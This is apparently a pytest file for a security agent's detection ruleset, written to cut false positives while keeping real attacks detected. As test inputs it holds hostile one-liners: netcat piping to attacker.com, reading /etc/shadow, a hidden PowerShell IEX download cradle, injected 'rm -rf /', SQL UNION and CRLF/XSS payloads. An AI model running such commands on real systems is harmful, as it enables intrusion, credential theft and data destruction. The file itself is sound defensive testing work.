"""Guards on the agent's detection rules.

A sample of 100 real events had 89 flagged CRITICAL / COMMAND INJECTION by a
single regex, `\\|(?:\\s*|)(\\w+)`, which matches a pipe followed by any word.
log_extractor joins Windows event fields with " | ", so the agent was matching
its own field separator. Three other patterns were nearly as broad: bare `\\r`
and `\\n` as CRLF injection, `\\.exe$` as file upload, and `\\b\\d{9}\\b` as PII.

Narrowing detection rules trades noise for the risk of missing something, so
both directions are pinned: the attacks that must still be caught, and the
routine telemetry that must stay quiet. Loosening the ruleset to silence noise
is only safe if the first list keeps passing.
"""
from __future__ import annotations

import pathlib
import re

import pytest
import yaml

RULES = pathlib.Path(__file__).resolve().parent.parent / "Sentora" / "conf" / "rules.yaml"


def _load():
    cfg = yaml.safe_load(RULES.read_text(encoding="utf-8")) or {}
    flags = 0
    for name in cfg.get("flags") or []:
        flags |= getattr(re, str(name).upper(), 0)
    rules, broken = [], []
    for category, spec in (cfg.get("categories") or {}).items():
        for line in ((spec or {}).get("patterns") or "").splitlines():
            pat = line.strip()
            if not pat or pat.startswith("#"):
                continue
            try:
                rules.append((category, pat, re.compile(pat, flags)))
            except re.error as e:
                broken.append((category, pat, str(e)))
    return rules, broken


RULESET, BROKEN = _load()


def matches(text: str):
    return [(c, p) for c, p, rx in RULESET if rx.search(text)]


# --------------------------------------------------------------------------
# Attacks that must still be detected
# --------------------------------------------------------------------------

@pytest.mark.parametrize("label,text", [
    ("pipe to whoami",     "cmd.exe /c dir | whoami"),
    ("pipe to netcat",     "ping 8.8.8.8 | nc attacker.com 4444"),
    ("pipe to base64",     "cat /etc/shadow | base64"),
    ("pipe to powershell", "echo x | powershell -enc SQBFAFgA"),
    ("encoded CRLF",       "/redir?url=%0d%0aSet-Cookie:%20admin=1"),
    ("header splitting",   "x=1%0d%0a%0d%0a<script>alert(1)</script>"),
    ("exe upload",         'Content-Disposition: form-data; filename="payload.exe"'),
    ("php upload",         "uploaded shell.php"),
    ("formatted SSN",      "ssn=123-45-6789"),
    ("rm -rf",             "; rm -rf /"),
    ("sql union",          "id=1' UNION SELECT NULL,NULL--"),
])
def test_real_attacks_are_still_caught(label, text):
    """The cost side of narrowing the rules. If any of these stop matching,
    the noise reduction went too far."""
    assert matches(text), f"{label} is no longer detected by any rule"


# --------------------------------------------------------------------------
# Routine telemetry that must stay quiet
# --------------------------------------------------------------------------

@pytest.mark.parametrize("label,text", [
    ("agent field separator",
     "[Software Protection Platform Service] EID=16384, Cat=0 | "
     "2126-07-29T16:05:55Z | RulesEngine"),
    ("shadow copy record",
     "[VSS] EID=8231, Cat=0 | taskhostw.exe | svchost.exe | services.exe"),
    ("multi-line log body", "line one\r\nline two\r\nline three"),
    ("windows binary path", "process: C:\\Windows\\System32\\svchost.exe"),
    ("nine digit counter", "bytes transferred: 123456789"),
    ("DCOM permission notice", "[DCOM] EID=10016, Cat=0 | Local | Activation"),
])
def test_routine_telemetry_does_not_fire(label, text):
    """These are the exact shapes that made up 89% of a real sample. Each one
    was previously stamped CRITICAL."""
    hits = matches(text)
    assert not hits, f"{label} still matches {hits[0][0]}: {hits[0][1]!r}"


# --------------------------------------------------------------------------
# The ruleset itself
# --------------------------------------------------------------------------

def test_every_pattern_compiles():
    """A pattern that will not compile is a category that can never fire, and
    nothing at runtime reports it - the agent skips it silently."""
    assert not BROKEN, f"{len(BROKEN)} uncompilable pattern(s): {BROKEN[:3]}"


def test_the_field_separator_rule_is_gone():
    """Pinned by exact text. This one regex accounted for 89 of 100 events in
    a real sample, so a re-introduction should fail loudly rather than be
    noticed months later."""
    assert not any(p == r"\|(?:\s*|)(\w+)" for _, p, _ in RULESET)


@pytest.mark.parametrize("pattern", [r"\r\n", r"\r", r"\n", r"\r\n\r\n", r"\n\n", r"\r\r"])
def test_bare_line_breaks_are_not_rules(pattern):
    """A blank line is not an attack."""
    assert not any(p == pattern for _, p, _ in RULESET)


# --------------------------------------------------------------------------
# Scoping: 821 of 1575 patterns cannot match endpoint telemetry
# --------------------------------------------------------------------------
#
# rules.yaml is mostly web-application attacks - SQL injection, XSS, XXE,
# template injection, prototype pollution. This agent collects Windows Event
# Log, process and network telemetry, Docker events and FIM. There is no HTTP
# request body anywhere in that, so those patterns can only produce false
# positives, and they did: `\btmp\b` as PATH TRAVERSAL fired on 30% of real
# events, `0x[0-9a-fA-F]{8,}` as SQL INJECTION on 20%.
#
# `applies_to` scopes a category. Nothing is deleted: the moment this platform
# ingests web logs the rules are there, unmodified.
#
# The risk is the opposite one - scoping away a detection that mattered. Most
# of what is pinned here is that endpoint attacks still match.

def _load_scoped(scope: str):
    cfg = yaml.safe_load(RULES.read_text(encoding="utf-8")) or {}
    flags = 0
    for name in cfg.get("flags") or []:
        flags |= getattr(re, str(name).upper(), 0)
    rules = []
    for category, spec in (cfg.get("categories") or {}).items():
        applies_to = (spec or {}).get("applies_to")
        if applies_to and scope != "all":
            if scope not in {str(s).strip().lower() for s in applies_to}:
                continue
        for line in ((spec or {}).get("patterns") or "").splitlines():
            pat = line.strip()
            if not pat or pat.startswith("#"):
                continue
            try:
                rules.append((category, pat, re.compile(pat, flags)))
            except re.error:
                pass
    return rules


def _matches_in(scope: str, text: str):
    return [(c, p) for c, p, rx in _load_scoped(scope) if rx.search(text)]


ENDPOINT_ATTACKS = [
    ("pipe to whoami",        "cmd.exe /c dir | whoami"),
    ("pipe to netcat",        "ping 8.8.8.8 | nc attacker.com 4444"),
    ("encoded powershell",    "echo x | powershell -enc SQBFAFgA"),
    ("powershell no profile", "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient)"),
    ("debug privilege",       "A privileged service was called: SeDebugPrivilege"),
    # The ruleset detects the *injection*, not the destructive command:
    # "sh -c 'rm -rf /'" matches nothing at any scope, because on its own it
    # is a legitimate thing to run. The leading `;` is the attack.
    ("injected rm",           "; rm -rf /"),
]


@pytest.mark.parametrize("label,text", ENDPOINT_ATTACKS)
def test_endpoint_attacks_survive_scoping(label, text):
    """The failure that would make scoping a mistake."""
    assert _matches_in("endpoint", text), (
        f"{label!r} is an endpoint attack and no longer matches once the "
        f"web-only categories are scoped out"
    )


def test_scoping_removes_a_meaningful_share_of_the_ruleset():
    """Otherwise the change is cosmetic and the noise remains."""
    endpoint = len(_load_scoped("endpoint"))
    everything = len(_load_scoped("all"))
    assert endpoint < everything * 0.6, (
        f"scope=endpoint loads {endpoint} of {everything} patterns; the "
        f"web-only categories are not actually being scoped out"
    )


def test_nothing_is_deleted():
    """Scoped, not removed. `all` must still compile the whole file."""
    assert len(_load_scoped("all")) == len(RULESET)


def test_web_attacks_still_match_when_web_logs_are_in_scope():
    for text in ("/redir?url=%0d%0aSet-Cookie:%20admin=1",
                 "id=1 UNION SELECT username,password FROM users"):
        assert _matches_in("web", text), text


@pytest.mark.parametrize("noisy,category", [
    (r"\btmp\b", "PATH TRAVERSAL"),
    (r"0x[0-9a-fA-F]{8,}", "SQL INJECTION"),
])
def test_the_measured_false_positives_are_out_of_endpoint_scope(noisy, category):
    """These two fired on 30% and 20% of real Windows events."""
    loaded = {(c, p) for c, p, _ in _load_scoped("endpoint")}
    assert (category, noisy) not in loaded


def test_an_unmarked_category_still_loads():
    """Fail open. A category nobody has classified is not evidence that it is
    irrelevant, and defaulting to skip would silently disable detections as
    the file grows."""
    cfg = yaml.safe_load(RULES.read_text(encoding="utf-8")) or {}
    unmarked = [k for k, v in (cfg.get("categories") or {}).items()
                if not (v or {}).get("applies_to")]
    assert unmarked, "every category is marked; this guard no longer proves anything"
    loaded = {c for c, _, _ in _load_scoped("endpoint")}
    for category in unmarked:
        assert category in loaded, f"{category} is unmarked but was not loaded"


@pytest.mark.parametrize("label,text,endpoint,web", [
    # Endpoint attacks: must survive scoping.
    ("pipe to whoami",     "cmd.exe /c dir | whoami",                             True,  True),
    ("pipe to netcat",     "ping 8.8.8.8 | nc attacker.com 4444",                 True,  True),
    ("pipe to base64",     "cat /etc/shadow | base64",                            True,  True),
    ("pipe to powershell", "echo x | powershell -enc SQBFAFgA",                   True,  True),
    ("php upload",         "uploaded shell.php",                                  True,  True),
    ("formatted SSN",      "ssn=123-45-6789",                                     True,  True),
    ("injected rm",        "; rm -rf /",                                          True,  True),
    # Web attacks: correctly out of endpoint scope. A Windows Security event
    # cannot contain a Content-Disposition header or a SQL UNION, so matching
    # these against endpoint telemetry only ever produced false positives.
    ("encoded CRLF",       "/redir?url=%0d%0aSet-Cookie:%20admin=1",              False, True),
    ("header splitting",   "x=1%0d%0a%0d%0a<script>alert(1)</script>",            False, True),
    ("exe upload",         'Content-Disposition: form-data; filename="payload.exe"', False, True),
    ("sql union",          "id=1' UNION SELECT NULL,NULL--",                      False, True),
])
def test_the_scope_split_is_explicit(label, text, endpoint, web):
    """Exactly which detections endpoint scope gives up, on the record.

    Four of the eleven attacks pinned above stop matching under
    RULES_SCOPE=endpoint. That is the intended trade and it should be a table
    someone can read, not something discovered later during an incident.

    If a row here flips, either a rule moved between categories or a category
    was rescoped - both worth knowing about deliberately.
    """
    assert bool(_matches_in("endpoint", text)) is endpoint
    assert bool(_matches_in("web", text)) is web
